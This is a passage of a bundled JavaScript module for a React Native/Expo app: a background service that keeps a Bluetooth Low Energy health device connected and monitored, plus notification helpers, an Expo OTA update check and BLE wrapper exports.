  DeviceEventEmitter.emit(BACKGROUND_BLE_EVENT, {
    ...status,
    timestamp: Date.now()
  });
};
var describeBleError = (error) => {
  if (!error) return "Unknown BLE error";
  return JSON.stringify({
    message: error.message,
    reason: error.reason,
    errorCode: error.errorCode,
    attErrorCode: error.attErrorCode,
    iosErrorCode: error.iosErrorCode,
    androidErrorCode: error.androidErrorCode
  });
};
var ensureBackgroundBleConnection = async ({
  deviceId,
  onHealthMetrics,
  onBleError
}) => {
  if (backgroundReconnectPromise) {
    return backgroundReconnectPromise;
  }
  backgroundReconnectPromise = (async () => {
    const activeDeviceId = await getBackgroundDeviceId(deviceId);
    if (!activeDeviceId) {
      emitBleStatus({ connected: false, reason: "missing-device-id" });
      return false;
    }
    const alreadyConnected = await BLEService_default.isConnected();
    if (!alreadyConnected) {
      BLEService_default.stopMonitoring();
      await BLEService_default.autoConnect(activeDeviceId);
      emitBleStatus({ connected: true, deviceId: activeDeviceId, reconnected: true });
    } else {
      emitBleStatus({ connected: true, deviceId: activeDeviceId, reconnected: false });
    }
    if (BLEService_default.hasActiveMonitor()) {
      return true;
    }
    BLEService_default.monitorHealthMetrics((error, metrics) => {
      if (error) {
        emitBleStatus({
          connected: false,
          deviceId: activeDeviceId,
          error: error.message,
          reason: error.reason
        });
        onBleError?.(error);
        return;
      }
      emitBleStatus({ connected: true, deviceId: activeDeviceId, metrics });
      onHealthMetrics?.(metrics);
    }, {
      replaceExisting: false
    });
    return true;
  })();
  try {
    return await backgroundReconnectPromise;
  } finally {
    backgroundReconnectPromise = null;
  }
};
var veryIntensiveTask = async (taskDataArguments = {}) => {
  const {
    delay: delay2 = backgroundServiceOptions.parameters.delay,
    deviceId,
    onHealthMetrics,
    onBleError,
    reconnectEveryTicks = 5
  } = taskDataArguments;
  let counter = 0;
  while (BackgroundService.isRunning()) {
    counter++;
    let bleConnected = false;
    console.log("Background Tick:", counter);
    if (counter === 1 || counter % reconnectEveryTicks === 0) {
      try {
        bleConnected = await ensureBackgroundBleConnection({
          deviceId,
          onHealthMetrics,
          onBleError
        });
      } catch (e) {
        console.log("Background BLE reconnect error:", describeBleError(e));
        emitBleStatus({
          connected: false,
          deviceId,
          error: e.message,
          reason: e.reason
        });
      }
    } else {
      bleConnected = await BLEService_default.isConnected();
      if (bleConnected && !BLEService_default.hasActiveMonitor()) {
        bleConnected = await ensureBackgroundBleConnection({
          deviceId,
          onHealthMetrics,
          onBleError
        });
      }
    }
    try {
      await BackgroundService.updateNotification({
        taskTitle: backgroundServiceOptions.taskTitle,
        taskDesc: bleConnected ? `BLE connected ${(/* @__PURE__ */ new Date()).toLocaleTimeString()}` : `BLE reconnecting ${(/* @__PURE__ */ new Date()).toLocaleTimeString()}`
      });
    } catch (e) {
      console.log("Notification update error:", e);
    }
    DeviceEventEmitter.emit(BACKGROUND_TICK_EVENT, {
      counter,
      timestamp: Date.now()
    });
    await sleep(delay2);
  }
};
var startBackgroundService = async (options = {}) => {
  try {
    if (BackgroundService.isRunning()) {
      console.log("Background Service already running");
      return true;
    }
    const bleGranted = await BLEService_default.requestPermissions();
    if (!bleGranted) {
      console.log("Bluetooth permission denied");
      return false;
    }
    const granted = await requestNotificationPermission();
    if (!granted) {
      console.log("Notification permission denied");
      return false;
    }
    await BackgroundService.start(veryIntensiveTask, {
      ...backgroundServiceOptions,
      ...options,
      parameters: {
        ...backgroundServiceOptions.parameters,
        ...options.parameters || {}
      }
    });
    console.log("Background Service Started");
    return true;
  } catch (e) {
    console.log("Start Background Service Error:", e);
    return false;
  }
};
var stopBackgroundService = async () => {
  try {
    if (BackgroundService.isRunning()) {
      await BackgroundService.stop();
      console.log("Background Service Stopped");
    }
    return true;
  } catch (e) {
    console.log("Stop Background Service Error:", e);
    return false;
  }
};
var isBackgroundServiceRunning = () => {
  return BackgroundService.isRunning();
};
var subscribeToBackgroundTicks = (listener) => {
  return DeviceEventEmitter.addListener(
    BACKGROUND_TICK_EVENT,
    listener
  );
};
var subscribeToBackgroundBle = (listener) => {
  return DeviceEventEmitter.addListener(BACKGROUND_BLE_EVENT, listener);
};
var getLastNotificationResponse = () => {
  return Notifications.getLastNotificationResponseAsync();
};
var subscribeToNotificationTaps = (listener) => {
  return Notifications.addNotificationResponseReceivedListener(listener);
};
var sendNormalNotification = async (title, body, data = {}) => {
  try {
    await configureNotifications();
    await Notifications.scheduleNotificationAsync({
      content: {
        title,
        body,
        data: {
          url: DEFAULT_LINKING_URI,
          ...data
        },
        ...Platform2.OS === "android" ? {
          channelId: "default"
        } : {}
      },
      trigger: null
    });
    console.log("Local Notification Sent");
  } catch (e) {
    console.log("Failed to send normal notification:", e);
  }
};
var updatePersistentNotification = async (options = {}) => {
  try {
    if (!BackgroundService.isRunning()) return;
    await BackgroundService.updateNotification({
      taskTitle: options.title || backgroundServiceOptions.taskTitle,
      taskDesc: options.body || options.desc || options.message || backgroundServiceOptions.taskDesc
    });
    console.log("Persistent notification updated");
  } catch (e) {
    console.log("Failed to update persistent notification:", e);
  }
};
var cancelAllNotifications = async () => {
  try {
    await Notifications.dismissAllNotificationsAsync();
  } catch (e) {
    console.log("Cancel notifications error:", e);
  }
};
var cancelNotification = async (identifier) => {
  try {
    await Notifications.cancelScheduledNotificationAsync(identifier);
  } catch (e) {
    console.log("Cancel notification error:", e);
  }
};

// src/update.ts
import * as Updates from "expo-updates";
async function checkForOTAUpdates() {
  if (__DEV__) {
    consoleApp("Skipping OTA check (development mode)");
    updatePersistentNotification({
      title: "OTA Update Check",
      body: "Skipping OTA check (development mode)"
    });
    return;
  }
  if (Updates.isEmbeddedLaunch) {
    consoleApp("Embedded launch");
    updatePersistentNotification({
      title: "OTA Update Check",
      body: "Embedded launch"
    });
  }
  try {
    consoleApp("==================================");
    consoleApp("Checking for OTA Updates...");
    consoleApp("Channel: " + Updates.channel);
    consoleApp("Runtime Version: " + Updates.runtimeVersion);
    consoleApp("Update ID: " + Updates.updateId);
    consoleApp("==================================");
    const update = await Updates.checkForUpdateAsync();
    if (update.isAvailable) {
      consoleApp("New OTA update available");
      updatePersistentNotification({
        title: "OTA Update Available",
        body: "Downloading update..."
      });
      await Updates.fetchUpdateAsync();
      consoleApp("Reloading...");
      updatePersistentNotification({
        title: "OTA Update Downloaded",
        body: "Reloading app..."
      });
      await Updates.reloadAsync();
    } else {
      consoleApp("Already up to date");
      updatePersistentNotification({
        title: "OTA Update Check",
        body: "Already up to date"
      });
    }
  } catch (e) {
    updatePersistentNotification({
      title: "OTA Update Error",
      body: e.message || "Unknown error"
    });
    consoleApp("OTA Update Error: " + e);
  }
}

// src/ble.ts
var requestBlePermission = () => BLEService_default.requestPermissions();
var onStateChange = (callback, emitCurrentState = true) => BLEService_default.onStateChange(callback, emitCurrentState);
var scanDevices = () => new Promise((resolve, reject) => {
  const devices = [];
  BLEService_default.scanDevices(
    (device) => {
      if (!devices.find((d) => d.id === device.id)) {
        devices.push(device);
      }
    },
    (error) => {
      if (error) {
        reject(error);
      } else {
        resolve(devices);
      }
    }
  );
});
var connect = (device) => BLEService_default.connect(device);
var autoConnect = (deviceId) => BLEService_default.autoConnect(deviceId);
var disconnect = () => BLEService_default.disconnect();
var isConnected = () => BLEService_default.isConnected();
var monitorHealthMetrics = (callback, options) => BLEService_default.monitorHealthMetrics(callback, options);
var monitorData = (callback, options) => BLEService_default.monitorHealthMetrics(callback, options);
var stopMonitoring = () => BLEService_default.stopMonitoring();
var hasActiveMonitor = () => BLEService_default.hasActiveMonitor();
var stopScan = () => BLEService_default.stopScan();
var sendCommand = (base64, characteristicUUID) => BLEService_default.sendCommand(base64, characteristicUUID);
var read = (uuid) => BLEService_default.read(uuid);
var getServices = () => BLEService_default.getServices();
var getConnectedDevice = () => BLEService_default.getConnectedDevice();
var destroy = () => BLEService_default.destroy();
var unpair = async () => {
  const device = BLEService_default.getConnectedDevice();
  if (!device) return false;
  await BLEService_default.disconnect();
  return true;
};
export {
  autoConnect,
  backgroundServiceOptions,
  cancelAllNotifications,
  cancelNotification,
  checkForOTAUpdates,
  configureNotifications,
  connect,
  consoleApp,
  destroy,
  disconnect,
  getConnectedDevice,
  getCurrentStatus,
  getEnhancedDeviceInfo as getDeviceInfo,
  getLastNotificationResponse,
  getServices,
  hasActiveMonitor,
  initializeLogger,
  isBackgroundServiceRunning,
  isConnected,
  monitorData,
  monitorHealthMetrics,
  onStateChange,
  read,
  requestBlePermission,
  requestNotificationPermission,
  scanDevices,
  sendCommand,
  sendNormalNotification,
  sleep,
  startBackgroundService,
  stopBackgroundService,
  stopMonitoring,
  stopScan,
  subscribeToBackgroundBle,
  subscribeToBackgroundTicks,
  subscribeToNotificationTaps,
  unpair,
  updatePersistentNotification,
  veryIntensiveTask
};
//# sourceMappingURL=index.mjs.map